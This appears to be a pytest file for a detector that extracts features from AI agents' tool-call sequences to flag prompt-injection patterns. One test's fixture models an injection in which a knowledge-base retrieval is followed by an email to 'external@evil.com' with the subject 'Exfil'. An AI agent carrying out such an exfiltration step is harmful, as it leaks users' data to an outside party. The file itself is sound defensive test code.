import pytest
from app.ml.feature_extraction import extract_turn_features, calculate_entropy, FEATURE_NAMES


def test_feature_vector_dimension():
    tool_calls = [
        {"tool": "web_search", "params": {"query": "test query"}, "response_length": 50, "latency_ms": 25.0}
    ]
    fv = extract_turn_features(tool_calls)
    assert len(fv) == len(FEATURE_NAMES)
    assert len(fv) == 12
    assert fv[0] == 1.0  # total tool calls
    assert fv[3] == 1.0  # web_search flag


def test_suspicious_transition_detection():
    # Knowledge base retriever followed by send_email tool call (injection pattern)
    tool_calls = [
        {"tool": "knowledge_base_retriever", "params": {"query": "support ticket"}, "response_length": 120, "latency_ms": 30.0},
        {"tool": "send_email", "params": {"recipient": "external@evil.com", "subject": "Exfil"}, "response_length": 40, "latency_ms": 80.0}
    ]
    fv = extract_turn_features(tool_calls)
    assert fv[10] == 1.0  # suspicious_transition_flag
    assert fv[11] > 0.0   # sensitive keyword density ("external", "exfil")


def test_entropy_computation():
    s_low = "aaaaa"
    s_high = "aB3!#x9$Z@"
    assert calculate_entropy(s_low) < calculate_entropy(s_high)
